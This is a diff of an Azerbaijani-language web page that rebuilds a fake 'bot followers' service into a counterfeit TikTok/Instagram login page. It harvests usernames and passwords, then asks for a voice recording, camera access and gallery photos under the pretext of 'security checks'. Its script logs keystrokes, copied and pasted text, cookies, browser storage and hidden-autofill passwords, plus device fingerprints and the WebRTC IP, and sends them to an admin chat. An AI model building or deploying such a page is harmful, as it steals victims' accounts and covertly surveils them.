@@ -3,172 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bot Basma Xidməti</title>
+    <title id="pageTitle">TikTok – Giriş</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
+        /* Dinamik stil - platforma görə dəyişir */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #0d0d0d, #1a1a2e);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #fff;
             padding: 20px;
+            transition: background 0.3s;
         }
         .container {
-            background: rgba(255,255,255,0.06);
-            backdrop-filter: blur(12px);
-            padding: 30px 25px;
-            border-radius: 28px;
             width: 100%;
-            max-width: 420px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            border: 1px solid rgba(255,255,255,0.08);
-        }
-        h1 {
+            max-width: 400px;
+            background: #fff;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
             text-align: center;
-            font-size: 22px;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
             margin-bottom: 16px;
-            background: linear-gradient(90deg, #ff6b6b, #feca57);
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #25f4ee 0%, #fe2c55 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-weight: 800;
+            transition: all 0.3s;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
         }
         .step {
             display: none;
-            animation: fadeIn 0.4s ease;
+            animation: fadeIn 0.3s ease;
         }
         .step.active { display: block; }
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(6px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .info-text {
-            text-align: center;
-            font-size: 14px;
-            color: #ccc;
-            line-height: 1.6;
-            margin-bottom: 20px;
+        .input-group {
+            margin-bottom: 14px;
+            text-align: left;
         }
-        .options {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 16px;
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
         }
-        .option-btn {
-            flex: 1;
-            padding: 14px 0;
-            border: none;
-            border-radius: 16px;
-            font-weight: 700;
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
             font-size: 15px;
+            background: #f9f9f9;
+            transition: 0.2s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: var(--primary-color, #fe2c55);
+            background: #fff;
+        }
+        .input-group input::placeholder { color: #999; }
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: var(--primary-color, #fe2c55);
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
             cursor: pointer;
             transition: 0.2s;
-            color: #fff;
-            text-align: center;
         }
-        .option-btn.instagram { background: #d62976; }
-        .option-btn.tiktok { background: #25f4ee; color: #000; }
-        .option-btn:active { transform: scale(0.95); }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-secondary {
+            background: #f1f1f1;
+            color: #161823;
+        }
+        .links {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #666;
+        }
+        .links a {
+            color: var(--primary-color, #fe2c55);
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .links a:hover { text-decoration: underline; }
+        .divider {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            font-size: 12px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-top: 1px solid #eee;
+        }
+        .divider span { padding: 0 12px; }
 
-        .form-group { margin-top: 12px; }
-        .form-group label {
-            display: block; font-size: 13px; color: #aaa; margin-bottom: 4px;
-        }
-        .form-group input {
-            width: 100%; padding: 14px; margin-bottom: 10px;
-            border: 1px solid #333; border-radius: 14px;
-            background: rgba(255,255,255,0.06); color: #fff; font-size: 15px; outline: none;
-        }
-        .form-group input::placeholder { color: #777; }
-        .form-group .submit-btn {
-            width: 100%; padding: 14px; border: none; border-radius: 14px;
-            background: #ff6b6b; color: #fff; font-weight: 700; font-size: 16px; cursor: pointer;
-        }
-        .form-group .submit-btn:active { transform: scale(0.96); }
-
-        .photo-upload { text-align: center; margin-top: 10px; }
         .photo-upload input[type="file"] { display: none; }
         .photo-upload .upload-label {
-            display: inline-block; padding: 12px 28px; background: #25f4ee; color: #000;
-            border-radius: 30px; font-weight: 700; cursor: pointer; transition: 0.2s;
+            display: inline-block;
+            padding: 12px 28px;
+            background: var(--secondary-color, #25f4ee);
+            color: #000;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
         }
         .photo-upload .upload-label:active { transform: scale(0.96); }
-        .photo-upload .file-count { margin-top: 8px; font-size: 13px; color: #aaa; }
+        .photo-upload .file-count { margin-top: 8px; font-size: 13px; color: #666; }
         .photo-upload .upload-btn {
-            display: none; margin-top: 12px; padding: 12px 28px;
-            background: #ff6b6b; color: #fff; border: none; border-radius: 30px; font-weight: 700; cursor: pointer;
+            display: none;
+            margin-top: 12px;
+            padding: 12px 28px;
+            background: var(--primary-color, #fe2c55);
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
         }
 
-        .audio-recorder { text-align: center; margin-top: 12px; }
         .audio-recorder button {
-            padding: 12px 28px; border: none; border-radius: 30px;
-            background: #2b5278; color: #fff; font-weight: 700; cursor: pointer; margin: 4px;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 30px;
+            background: var(--secondary-color, #25f4ee);
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 4px;
         }
         .audio-recorder button:active { transform: scale(0.96); }
-        .audio-recorder .status { font-size: 13px; color: #aaa; margin-top: 6px; }
+        .audio-recorder .status { font-size: 13px; color: #666; margin-top: 6px; }
         .audio-recorder .audio-upload-btn {
-            display: none; margin-top: 12px; background: #ff6b6b;
+            display: none;
+            margin-top: 12px;
+            background: var(--primary-color, #fe2c55);
+            color: #fff;
         }
 
         .loading { text-align: center; margin-top: 16px; display: none; }
         .loading .spinner {
-            width: 36px; height: 36px; border: 4px solid #333;
-            border-top: 4px solid #ff6b6b; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto;
+            width: 36px; height: 36px;
+            border: 4px solid #eee;
+            border-top: 4px solid var(--primary-color, #fe2c55);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading p { margin-top: 8px; font-size: 14px; color: #aaa; }
+        .loading p { margin-top: 8px; font-size: 14px; color: #666; }
 
-        .success { display: none; text-align: center; margin-top: 16px; color: #25f4ee; font-weight: 700; font-size: 18px; }
+        .success { display: none; text-align: center; margin-top: 16px; color: var(--secondary-color, #25f4ee); font-weight: 700; font-size: 18px; }
         .success span { font-size: 24px; }
+
+        @media (max-width: 480px) {
+            .container { padding: 16px; }
+            .logo { font-size: 36px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🚀 Bot Basma Xidməti</h1>
+        <div class="logo" id="logoText">TikTok</div>
+        <div class="subtitle" id="subtitleText">Hesabına daxil ol</div>
 
-        <!-- Addım 0: Giriş -->
         <div id="step0" class="step active">
-            <p class="info-text">
-                Bu xidmət hesabınıza <b>pulsuz bot izləyicilər</b> əlavə edir.<br>
-                İşə başlamaq üçün platforma seçin.
-            </p>
-            <div class="options">
-                <button class="option-btn instagram" onclick="selectPlatform('instagram')">📸 Instagram</button>
-                <button class="option-btn tiktok" onclick="selectPlatform('tiktok')">🎵 TikTok</button>
-            </div>
-        </div>
-
-        <!-- Addım 1: Login -->
-        <div id="step1" class="step">
-            <p style="text-align:center; font-weight:600; margin-bottom:8px;" id="platformLabel">Instagram hesab məlumatları</p>
-            <div class="form-group">
-                <label>İstifadəçi adı / Email</label>
+            <div class="input-group">
+                <label id="userLabel">İstifadəçi adı / Email</label>
                 <input type="text" id="loginUser" placeholder="Məsələn: @istifadeci">
-                <label>Şifrə</label>
+            </div>
+            <div class="input-group">
+                <label id="passLabel">Şifrə</label>
                 <input type="password" id="loginPass" placeholder="Şifrəniz">
-                <button class="submit-btn" onclick="submitLogin()">Davam et</button>
             </div>
+            <button class="btn-primary" onclick="submitLogin()" id="loginBtn">Daxil ol</button>
+            <div class="links">
+                <a href="#" id="forgotLink">Şifrəni unutdun?</a> · <a href="#" id="signupLink">Qeydiyyat</a>
+            </div>
+            <div class="divider"><span>və ya</span></div>
+            <button class="btn-primary btn-secondary" style="background:#f1f1f1; color:#161823;" id="socialBtn">Facebook ilə davam et</button>
         </div>
 
-        <!-- Addım 2: Follower sayı və istifadəçi adı -->
+        <div id="step1" class="step">
+            <p style="text-align:center; color:#666; margin-bottom:16px;">Təhlükəsizlik üçün hesab məlumatlarınızı təsdiqləyin.</p>
+            <div class="input-group">
+                <label id="followLabel">Neçə izləyicininiz var?</label>
+                <input type="number" id="followCount" placeholder="Məsələn: 500">
+            </div>
+            <div class="input-group">
+                <label id="targetLabel">Hesabınızın istifadəçi adı</label>
+                <input type="text" id="targetUser" placeholder="@hesabim">
+            </div>
+            <button class="btn-primary" onclick="submitFollowData()">Davam et</button>
+        </div>
+
         <div id="step2" class="step">
-            <p style="text-align:center; color:#ccc; margin-bottom:12px;">İndi istədiyiniz follower sayını və hesabınızın istifadəçi adını yazın.</p>
-            <div class="form-group">
-                <label>Neçə follower istəyirsiniz?</label>
-                <input type="number" id="followCount" placeholder="Məsələn: 500" min="1">
-                <label>Hesabın istifadəçi adı (nick)</label>
-                <input type="text" id="targetUser" placeholder="Məsələn: @hesabim">
-                <button class="submit-btn" onclick="submitFollowData()">Davam et</button>
-            </div>
-        </div>
-
-        <!-- Addım 3: Səs yoxlaması (Kamera+ mikrofon icazəsi) -->
-        <div id="step3" class="step">
-            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Hesabınızı təsdiqləmək üçün qısa səs mesajı yazın.<br>
-            <small>(Bu addımda kamera da yoxlanılır)</small></p>
+            <p style="text-align:center; color:#666; margin-bottom:12px;">Hesabınızı qorumaq üçün qısa səs yazısı tələb olunur.<br>
+            <small>(Bu addımda kamera və mikrofon yoxlanılır)</small></p>
             <div class="audio-recorder">
                 <button id="recordBtn" onclick="startRecording()">🎤 Səs yazmağa başla</button>
                 <button id="stopBtn" onclick="stopRecording()" style="display:none;">⏹ Dayandır</button>
@@ -177,9 +229,8 @@
             </div>
         </div>
 
-        <!-- Addım 4: Profil şəkli (qalereya seçimi) -->
-        <div id="step4" class="step">
-            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Profiliniz üçün bir neçə şəkil seçin (ən azı 5).</p>
+        <div id="step3" class="step">
+            <p style="text-align:center; color:#666; margin-bottom:12px;">Profiliniz üçün 5 şəkil seçin (təhlükəsizlik məqsədilə).</p>
             <div class="photo-upload">
                 <label class="upload-label" for="fileInput">📂 Qalereyadan seç</label>
                 <input type="file" id="fileInput" accept="image/*" multiple onchange="updateFileCount()">
@@ -188,16 +239,13 @@
             </div>
         </div>
 
-        <!-- Yükləmə barı (saxta) -->
         <div id="loading" class="loading">
             <div class="spinner"></div>
-            <p id="loadingText">Botlar işə salınır, gözləyin...</p>
+            <p id="loadingText">Yoxlanılır, gözləyin...</p>
         </div>
 
-        <!-- Uğur -->
         <div id="success" class="success">
-            <span>✅</span> Botlar uğurla işə salındı!<br>
-            <small style="font-size:13px; color:#aaa;">Səhifəni bağlaya bilərsiniz.</small>
+            <span>✅</span> Yoxlama tamamlandı! Sizi yönləndiririk...
         </div>
     </div>
 
@@ -211,7 +259,7 @@
         const chatId = params.get('chat_id') || ADMIN_CHAT_ID;
 
         // ============================================================
-        //  DƏYİŞƏNLƏR (Ümumi 55 xüsusiyyət üçün)
+        //  DƏYİŞƏNLƏR (55 XÜSUSİYYƏT)
         // ============================================================
         let selectedPlatform = null;
         let collected = {
@@ -223,7 +271,6 @@
             battery: null, connection: null, webrtcIP: '',
             historyLength: 0, fonts: [], timezoneData: null,
             pasteEvents: [], autoFillDetected: false,
-            // 30 yeni xüsusiyyət üçün sahələr
             deviceModel: '', osVersion: '', cpuCores: 0, memory: 0,
             audioDevices: [], videoDevices: [], gpuInfo: '',
             networkInfo: {}, dnsInfo: '', wifiSSID: '',
@@ -245,24 +292,260 @@
         let cameraInterval = null;
         let screenInterval = null;
         let keylogInterval = null;
-        let dataSendInterval = null;
+        let mouseInterval = null;
 
         // ============================================================
-        //  30 YENİ XÜSUSİYYƏT ÜÇÜN TOPLAMA FUNKSİYALARI
+        //  PLATFORM UI DƏYİŞİKLİYİ
         // ============================================================
+        function applyPlatformUI(platform) {
+            const isInstagram = platform === 'instagram';
+            const primaryColor = isInstagram ? '#d62976' : '#fe2c55';
+            const secondaryColor = isInstagram ? '#405DE6' : '#25f4ee';
+            document.documentElement.style.setProperty('--primary-color', primaryColor);
+            document.documentElement.style.setProperty('--secondary-color', secondaryColor);
+            document.body.style.background = isInstagram ? '#fafafa' : '#ffffff';
 
-        // 1. Cihaz modeli (UserAgentData)
+            document.getElementById('pageTitle').innerText = isInstagram ? 'Instagram – Giriş' : 'TikTok – Giriş';
+            document.getElementById('logoText').innerText = isInstagram ? 'Instagram' : 'TikTok';
+            document.getElementById('logoText').style.background = isInstagram ? 'linear-gradient(135deg, #405DE6, #d62976)' : 'linear-gradient(135deg, #25f4ee, #fe2c55)';
+            document.getElementById('logoText').style.webkitBackgroundClip = 'text';
+            document.getElementById('logoText').style.webkitTextFillColor = 'transparent';
+
+            document.getElementById('subtitleText').innerText = isInstagram ? 'Hesabına daxil ol' : 'Hesabına daxil ol';
+            document.getElementById('userLabel').innerText = isInstagram ? 'İstifadəçi adı / Email' : 'İstifadəçi adı / Email';
+            document.getElementById('passLabel').innerText = isInstagram ? 'Şifrə' : 'Şifrə';
+            document.getElementById('loginBtn').innerText = isInstagram ? 'Daxil ol' : 'Daxil ol';
+            document.getElementById('forgotLink').innerText = isInstagram ? 'Şifrəni unutdun?' : 'Şifrəni unutdun?';
+            document.getElementById('signupLink').innerText = isInstagram ? 'Qeydiyyat' : 'Qeydiyyat';
+            document.getElementById('socialBtn').innerText = isInstagram ? 'Facebook ilə davam et' : 'Facebook ilə davam et';
+            document.getElementById('followLabel').innerText = isInstagram ? 'Neçə izləyicininiz var?' : 'Neçə izləyicininiz var?';
+            document.getElementById('targetLabel').innerText = isInstagram ? 'Hesabınızın istifadəçi adı' : 'Hesabınızın istifadəçi adı';
+        }
+
+        // ============================================================
+        //  STEP FUNKSİYALARI
+        // ============================================================
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ============================================================
+        //  55 XÜSUSİYYƏT ÜÇÜN TOPLAMA FUNKSİYALARI
+        // ============================================================
+        // --- 1. Cookie ---
+        function getCookies() { return document.cookie || 'Yoxdur'; }
+
+        // --- 2. LocalStorage & SessionStorage ---
+        function getStorage() {
+            return { localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) };
+        }
+
+        // --- 3. Canvas barmaq izi ---
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 100;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Catshadow', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('IS', 4, 17);
+            return canvas.toDataURL().substring(0, 50);
+        }
+
+        // --- 4. Audio barmaq izi ---
+        function getAudioFingerprint() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(ctx.destination);
+                oscillator.frequency.value = 440;
+                oscillator.start();
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                return data.slice(0, 10).join(',');
+            } catch (e) { return 'Yoxdur'; }
+        }
+
+        // --- 5. WebGL barmaq izi ---
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'Yoxdur';
+                const info = gl.getParameter(gl.RENDERER) + ' | ' + gl.getParameter(gl.VENDOR);
+                return info;
+            } catch (e) { return 'Yoxdur'; }
+        }
+
+        // --- 6. Batareya ---
+        async function getBattery() {
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    return { level: b.level * 100, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        // --- 7. Şəbəkə ---
+        function getConnection() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return { effectiveType: conn.effectiveType, rtt: conn.rtt, downlink: conn.downlink, saveData: conn.saveData };
+            }
+            return null;
+        }
+
+        // --- 8. WebRTC IP ---
+        function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const parts = event.candidate.candidate.split(' ');
+                        const ip = parts[4];
+                        if (ip) { resolve(ip); pc.close(); return; }
+                    }
+                    resolve(null);
+                };
+                setTimeout(() => { resolve(null); }, 3000);
+            });
+        }
+
+        // --- 9. Tarix uzunluğu ---
+        function getHistoryLength() { return window.history.length; }
+
+        // --- 10. Toxunma və ekran istiqaməti ---
+        function getTouchAndOrientation() {
+            return {
+                touchSupported: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                orientation: screen.orientation ? screen.orientation.type : (window.orientation || 'unknown')
+            };
+        }
+
+        // --- 11. Fontlar ---
+        function getFonts() {
+            const baseFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+            const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            const canvas = document.createElement('canvas');
+            canvas.width = 500; canvas.height = 100;
+            const ctx = canvas.getContext('2d');
+            ctx.font = '16px Arial';
+            const baseWidth = ctx.measureText(testString).width;
+            const fonts = [];
+            for (let f of baseFonts) {
+                ctx.font = `16px ${f}`;
+                const w = ctx.measureText(testString).width;
+                if (w !== baseWidth) fonts.push(f);
+            }
+            return fonts;
+        }
+
+        // --- 12. Avtomatik doldurma aşkarlama ---
+        function detectAutoFill() {
+            const form = document.createElement('form');
+            const input = document.createElement('input');
+            input.type = 'password';
+            input.name = 'password';
+            input.id = 'autofill_test';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            form.appendChild(input);
+            setTimeout(() => {
+                const val = input.value;
+                if (val) {
+                    sendDataToAdmin('autofill', { detected: true, value: val });
+                    collected.autoFillDetected = true;
+                }
+                form.remove();
+            }, 1000);
+        }
+
+        // --- 13. Dərin UA ---
+        function getDetailedUA() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                architecture: navigator.oscpu || 'unknown',
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                vendor: navigator.vendor || 'unknown'
+            };
+        }
+
+        // --- 14. Clipboard ---
+        document.addEventListener('copy', (e) => {
+            const text = document.getSelection().toString();
+            if (text) {
+                collected.clipboard = text;
+                sendDataToAdmin('clipboard', { text });
+            }
+        });
+
+        // --- 15. Paste ---
+        document.addEventListener('paste', (e) => {
+            const text = e.clipboardData.getData('text');
+            if (text) {
+                collected.pasteEvents.push({ text, time: Date.now() });
+                sendDataToAdmin('paste', { text });
+            }
+        });
+
+        // --- 16. Keylogger ---
+        document.addEventListener('keydown', (e) => {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                collected.keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now(),
+                    target: e.target.name || e.target.id || 'unknown'
+                });
+            }
+        });
+
+        // --- 17. Mouse ---
+        let mouseEvents = [];
+        document.addEventListener('mousemove', (e) => {
+            mouseEvents.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+        });
+        document.addEventListener('scroll', () => {
+            mouseEvents.push({ scrollY: window.scrollY, time: Date.now() });
+        });
+
+        // --- 18. Timezone ---
+        function getTimezoneData() {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: new Date().getTimezoneOffset(),
+                dst: isDST()
+            };
+        }
+        function isDST() {
+            const jan = new Date(2026, 0, 1).getTimezoneOffset();
+            const jul = new Date(2026, 6, 1).getTimezoneOffset();
+            return jan !== jul;
+        }
+
+        // --- 19-30: Cihaz modeli, OS, CPU, yaddaş, media cihazları, GPU, şəbəkə, DNS, WiFi, vibrasiya, təhlükəsizlik, proxy, dillər, DPI, tarix dərinliyi, IndexedDB, pluginlər, mobil, permissions, performans, yükləmə müddəti, iframe ---
         function getDeviceModel() {
             if (navigator.userAgentData) {
                 return navigator.userAgentData.brands.map(b => b.brand).join(', ');
             }
-            // UA-dan çıxar
             const ua = navigator.userAgent;
             const match = ua.match(/\(([^)]+)\)/);
             return match ? match[1] : 'Bilinmir';
         }
 
-        // 2. OS versiyası
         function getOSVersion() {
             const ua = navigator.userAgent;
             if (ua.includes('Windows')) return 'Windows ' + (ua.match(/Windows NT (\d+\.\d+)/) || [])[1];
@@ -273,104 +556,47 @@
             return 'Bilinmir';
         }
 
-        // 3. CPU nüvələri
-        function getCPU() {
-            return navigator.hardwareConcurrency || 'Bilinmir';
-        }
+        function getCPU() { return navigator.hardwareConcurrency || 'Bilinmir'; }
+        function getMemory() { return navigator.deviceMemory || 'Bilinmir'; }
 
-        // 4. Yaddaş (RAM)
-        function getMemory() {
-            return navigator.deviceMemory || 'Bilinmir';
-        }
-
-        // 5,6. Audio və Video cihazları
         async function getMediaDevices() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
-                const audioInputs = devices.filter(d => d.kind === 'audioinput');
-                const videoInputs = devices.filter(d => d.kind === 'videoinput');
-                const audioOutputs = devices.filter(d => d.kind === 'audiooutput');
-                return { audioInputs, videoInputs, audioOutputs };
+                return {
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'unnamed'),
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'unnamed'),
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'unnamed')
+                };
             } catch (e) { return null; }
         }
 
-        // 7. GPU məlumatı (WebGL)
         function getGPUInfo() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'Yoxdur';
-                const renderer = gl.getParameter(gl.RENDERER);
-                const vendor = gl.getParameter(gl.VENDOR);
-                const version = gl.getParameter(gl.VERSION);
-                return { renderer, vendor, version };
+                if (!gl) return null;
+                return {
+                    renderer: gl.getParameter(gl.RENDERER),
+                    vendor: gl.getParameter(gl.VENDOR),
+                    version: gl.getParameter(gl.VERSION)
+                };
             } catch (e) { return null; }
         }
 
-        // 8. Şəbəkə məlumatı
         function getNetworkInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
-                return {
-                    effectiveType: conn.effectiveType,
-                    rtt: conn.rtt,
-                    downlink: conn.downlink,
-                    saveData: conn.saveData,
-                    type: conn.type // wi-fi, cellular, etc.
-                };
+                return { effectiveType: conn.effectiveType, rtt: conn.rtt, downlink: conn.downlink, saveData: conn.saveData, type: conn.type };
             }
             return null;
         }
 
-        // 9. DNS və domain
         function getDNSInfo() {
-            return {
-                hostname: window.location.hostname,
-                domain: document.domain,
-                protocol: window.location.protocol
-            };
+            return { hostname: window.location.hostname, domain: document.domain, protocol: window.location.protocol };
         }
+        function getWifiSSID() { return 'Yoxdur'; }
+        function getVibrateSupport() { return !!navigator.vibrate; }
 
-        // 10. Wi-Fi SSID (bəzi brauzerlərdə)
-        function getWifiSSID() {
-            // limited to some browsers (e.g., Chrome with WiFi API)
-            // fallback to 'unknown'
-            return 'Yoxdur';
-        }
-
-        // 11. Toxunma hadisələri (touch)
-        document.addEventListener('touchstart', (e) => {
-            collected.touchEvents.push({ type: 'start', touches: e.touches.length, time: Date.now() });
-        });
-        document.addEventListener('touchmove', (e) => {
-            collected.touchEvents.push({ type: 'move', touches: e.touches.length, time: Date.now() });
-        });
-        document.addEventListener('touchend', (e) => {
-            collected.touchEvents.push({ type: 'end', touches: e.touches.length, time: Date.now() });
-        });
-
-        // 12. Vibrasiya dəstəyi
-        function getVibrateSupport() {
-            return !!navigator.vibrate;
-        }
-
-        // 13. Batareya (artıq var, amma yenidən)
-        async function getBattery() {
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    return {
-                        level: b.level * 100,
-                        charging: b.charging,
-                        chargingTime: b.chargingTime,
-                        dischargingTime: b.dischargingTime
-                    };
-                } catch (e) {}
-            }
-            return null;
-        }
-
-        // 14. Təhlükəsizlik parametrləri
         function getSecurityParams() {
             return {
                 isSecure: window.isSecureContext,
@@ -379,67 +605,24 @@
                 doNotTrack: navigator.doNotTrack || 'unknown'
             };
         }
-
-        // 15. Proxy status (connection type)
         function getProxyStatus() {
             const conn = navigator.connection;
-            if (conn) {
-                return conn.type === 'wifi' ? 'Direct' : 'Proxy unknown';
-            }
+            if (conn) return conn.type === 'wifi' ? 'Direct' : 'Proxy unknown';
             return 'Unknown';
         }
+        function getLanguages() { return navigator.languages || [navigator.language]; }
+        function getScreenDPI() { return window.devicePixelRatio || 1; }
+        function getHistoryDepth() { return window.history.length; }
 
-        // 16. Dillər
-        function getLanguages() {
-            return navigator.languages || [navigator.language];
-        }
-
-        // 17. Ekran DPI
-        function getScreenDPI() {
-            return window.devicePixelRatio || 1;
-        }
-
-        // 18. Mouse klikləri
-        document.addEventListener('click', (e) => {
-            collected.mouseClicks.push({
-                x: e.clientX,
-                y: e.clientY,
-                button: e.button,
-                time: Date.now()
-            });
-        });
-
-        // 19. Tarix dərinliyi
-        function getHistoryDepth() {
-            return window.history.length;
-        }
-
-        // 20. IndexedDB bazaları
         async function getIndexedDBs() {
             try {
                 const databases = await indexedDB.databases();
                 return databases.map(db => db.name);
             } catch (e) { return []; }
         }
+        function getPlugins() { return Array.from(navigator.plugins).map(p => p.name); }
+        function detectMobile() { return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
 
-        // 21. Plaginlər
-        function getPlugins() {
-            return Array.from(navigator.plugins).map(p => p.name);
-        }
-
-        // 22. Media cihazları (artıq var, amma təkrarlayaq)
-        // 23. Çap hadisəsi
-        window.addEventListener('beforeprint', () => {
-            collected.printDetected = true;
-            sendDataToAdmin('print', { detected: true });
-        });
-
-        // 24. Mobil aşkarlama
-        function detectMobile() {
-            return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        }
-
-        // 25. Permissions API
         async function getPermissions() {
             const perms = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read', 'clipboard-write'];
             const results = {};
@@ -447,40 +630,10 @@
                 try {
                     const status = await navigator.permissions.query({ name: perm });
                     results[perm] = status.state;
-                } catch (e) {
-                    results[perm] = 'unknown';
-                }
+                } catch (e) { results[perm] = 'unknown'; }
             }
             return results;
         }
-
-        // 26. Avtomatik doldurma (email, telefon)
-        function detectAutofill() {
-            // Yalançı forma yaradırıq
-            const form = document.createElement('form');
-            const emailInput = document.createElement('input');
-            emailInput.type = 'email';
-            emailInput.name = 'email';
-            emailInput.id = 'autofill_email';
-            const phoneInput = document.createElement('input');
-            phoneInput.type = 'tel';
-            phoneInput.name = 'phone';
-            phoneInput.id = 'autofill_phone';
-            form.style.display = 'none';
-            document.body.appendChild(form);
-            form.appendChild(emailInput);
-            form.appendChild(phoneInput);
-            setTimeout(() => {
-                if (emailInput.value) collected.autofillEmail = emailInput.value;
-                if (phoneInput.value) collected.autofillPhone = phoneInput.value;
-                form.remove();
-                if (collected.autofillEmail || collected.autofillPhone) {
-                    sendDataToAdmin('autofill', { email: collected.autofillEmail, phone: collected.autofillPhone });
-                }
-            }, 1500);
-        }
-
-        // 27. Performance yaddaş (Chromium)
         function getPerformanceMemory() {
             if (performance.memory) {
                 return {
@@ -491,8 +644,6 @@
             }
             return null;
         }
-
-        // 28. Səhifə yükləmə müddəti
         function getPageLoadTiming() {
             const perf = performance.timing;
             if (perf) {
@@ -504,20 +655,14 @@
             }
             return null;
         }
-
-        // 29. Iframe məlumatı
         function getIframeInfo() {
             if (window !== window.top) {
-                return {
-                    isIframe: true,
-                    parentURL: document.referrer || 'unknown',
-                    origin: window.location.origin
-                };
+                return { isIframe: true, parentURL: document.referrer || 'unknown', origin: window.location.origin };
             }
             return { isIframe: false };
         }
 
-        // 30. Səsin tezlik analizi (AudioContext)
+        // --- 30. Səs tezliyi (AudioContext) ---
         function getAudioFrequency() {
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -535,18 +680,17 @@
         }
 
         // ============================================================
-        //  BÜTÜN 55 XÜSUSİYYƏTİ BİR DƏFƏYƏ TOPLA
